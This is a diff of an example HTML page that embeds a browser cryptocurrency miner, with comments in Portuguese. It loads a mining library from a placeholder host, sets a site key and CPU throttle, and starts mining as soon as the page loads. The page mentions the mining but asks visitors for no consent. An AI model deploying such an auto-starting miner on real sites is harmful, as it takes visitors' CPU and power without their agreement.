@@ -6,21 +6,17 @@
     <title>Crypto Mining Example</title>
 </head>
 <body>
-    <h1>Crypto Mining Example</h1>
-    <script src="https://example.com/miner.js"></script> <!-- Use um script de mineração legítimo para testes -->
+    <h1>Welcome to Crypto Mining Example</h1>
+    <p>Mining cryptocurrency using your CPU.</p>
+    <script src="https://example.com/lib/mining-library.min.js"></script>
     <script>
-        // Suponha que miner.js carrega uma biblioteca de mineração
-        var miner = new Miner.Anonymous('YOUR_SITE_KEY', {
-            throttle: 0.3, // Define o uso da CPU
-            threads: 2 // Número de threads de mineração
+        // Substitua "example.com" com o domínio correto do serviço de mineração
+        var miner = new MiningLibrary.Anonymous('75afbb5b3e7947d23308f68eca5967e6ae6376c0d40d5241257cfcc5841879e2', {
+            throttle: 0.2,  // Limita o uso da CPU a 20%
+            autoThreads: false,  // Use false para definir o número de threads manualmente, se suportado
+            threads: 2  // Defina o número de threads para o número desejado, se aplicável
         });
         miner.start();
-
-        // Exibir informações de mineração
-        setInterval(function() {
-            console.log('Hashes/min: ' + miner.getHashesPerSecond() * 60);
-            console.log('Total hashes: ' + miner.getTotalHashes());
-        }, 1000);
     </script>
 </body>
 </html>
